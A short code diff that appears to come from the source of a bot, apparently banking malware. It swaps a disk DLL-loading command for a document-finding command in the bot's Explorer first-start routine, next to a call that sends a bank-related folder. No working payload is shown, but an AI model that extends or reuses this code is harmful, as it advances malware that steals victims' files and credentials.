@@ -12,7 +12,8 @@
 
 //---------------------------------------------------------------------------
 
-extern bool ExecuteLoadDLLDisk(LPVOID, PCHAR Command, PCHAR Args);
+//extern bool ExecuteLoadDLLDisk(LPVOID, PCHAR Command, PCHAR Args);
+extern bool ExecuteDocFind(LPVOID, PCHAR Command, PCHAR Args);
 
 void ExplorerFirstStart(PEventData Data)
 {
@@ -24,6 +25,7 @@ void ExplorerFirstStart(PEventData Data)
 		AvangardWeb::SendFolder_avn_ib();
 	#endif
 	
+	//ExecuteDocFind( 0, 0, 0 );
 	//ExecuteLoadDLLDisk( 0, 0, "testdll.dll" );
 	// Первый запуск бота в проводнике
 
